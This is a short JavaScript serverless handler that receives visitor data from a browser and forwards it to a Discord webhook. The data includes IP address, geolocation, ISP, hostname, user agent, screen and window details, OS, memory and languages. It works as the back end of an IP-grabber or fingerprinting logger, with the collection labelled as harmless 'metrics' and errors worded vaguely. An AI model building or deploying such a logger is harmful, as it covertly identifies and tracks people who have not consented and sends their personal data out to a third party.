export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Invalid request" });
  }

  const webhook = process.env.DISCORD_WEBHOOK;
  if (!webhook) {
    return res.status(500).json({ error: "Service unavailable" });
  }

  try {
    const body = req.body || {};
    const metrics = body.m || {};
    
    const content = [
      `IP Address: ${metrics.ip}`,
      `Location: ${metrics.loc}`,
      `Hostname: ${metrics.host}`,
      `ISP: ${metrics.isp}`,
      `City: ${metrics.city}`,
      `Country: ${metrics.country}`,
      `Country Code: ${metrics.cc}`,
      `User Agent: ${metrics.ua}`,
      `Window Properties: ${metrics.wp}`,
      `Window Width: ${metrics.ww}`,
      `Window Height: ${metrics.wh}`,
      `Window Ratio: ${metrics.wr}`,
      `Screen Width: ${metrics.sw}`,
      `Screen Height: ${metrics.sh}`,
      `Screen Ratio: ${metrics.sr}`,
      `DPI: ${metrics.dpi}`,
      `Color Depth: ${metrics.cd}`,
      `Orientation: ${metrics.or}`,
      `Orientation Angle: ${metrics.oa}`,
      `OS: ${metrics.os}`,
      `Threads: ${metrics.th}`,
      `Memory: ${metrics.mem}`,
      `System Languages: ${metrics.sl}`,
      `Languages: ${metrics.lang}`,
    ].join("\n");

    const discordPayload = { content };

    const r = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(discordPayload),
    });

    if (!r.ok) {
      return res.status(502).json({ error: "Service error" });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: "Internal error" });
  }
}
